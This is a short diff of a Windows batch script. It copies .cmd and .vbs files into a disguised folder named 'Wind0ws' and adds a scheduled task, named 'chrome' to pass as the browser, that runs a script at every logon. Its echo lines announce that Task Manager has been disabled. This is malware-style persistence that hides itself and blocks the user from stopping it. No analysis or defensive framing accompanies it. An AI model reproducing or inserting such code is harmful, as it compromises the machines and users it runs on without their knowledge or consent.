@@ -41,6 +41,7 @@ copy runatstart.cmd A:\Wind0ws
 copy msg.vbs A:\Wind0ws
 copy stw.vbs A:\Wind0ws
 copy e.cmd A:\Wind0ws
+SchTasks /Create  /SC ONLOGON /TN "chrome"  /TR  C:\Wind1\runatstart.cmd
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
